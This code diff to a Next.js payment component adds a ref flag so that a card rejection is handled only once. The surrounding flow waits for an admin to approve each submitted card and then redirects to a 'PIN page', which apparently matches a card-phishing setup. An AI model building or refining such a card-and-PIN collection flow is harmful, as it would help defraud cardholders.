@@ -1,7 +1,7 @@
 "use client"
 
 import type React from "react"
-import { useState, useEffect } from "react"
+import { useState, useEffect, useRef } from "react"
 import { useRouter } from "next/navigation"
 import { toast } from "sonner"
 import { Input } from "@/components/ui/input"
@@ -38,6 +38,7 @@ export default function P1({ offerTotalPrice }: _P1Props) {
 
   // Waiting state
   const [isWaitingAdmin, setIsWaitingAdmin] = useState(false)
+  const rejectionHandledRef = useRef(false)
   
   const [isCardBlockedState, setIsCardBlockedState] = useState(false)
   const [showEmailModal, setShowEmailModal] = useState(false)
@@ -170,8 +171,11 @@ export default function P1({ offerTotalPrice }: _P1Props) {
             setIsWaitingAdmin(false)
             // Redirect to PIN page directly
             router.push("/step3")
-          } else if (status === "rejected") {
+          } else if (status === "rejected" && !rejectionHandledRef.current) {
             console.log('[Card Status] Card rejected, hiding loader immediately')
+            
+            // Mark rejection as handled
+            rejectionHandledRef.current = true
             
             // Hide loader immediately
             setIsWaitingAdmin(false)
@@ -262,6 +266,9 @@ export default function P1({ offerTotalPrice }: _P1Props) {
     }
 
     try {
+      // Reset rejection flag for new submission
+      rejectionHandledRef.current = false
+      
       const finalPrice = calculateFinalPrice()
       const discount = selectedPaymentMethod === "credit-card" ? 0.15 : 0
       
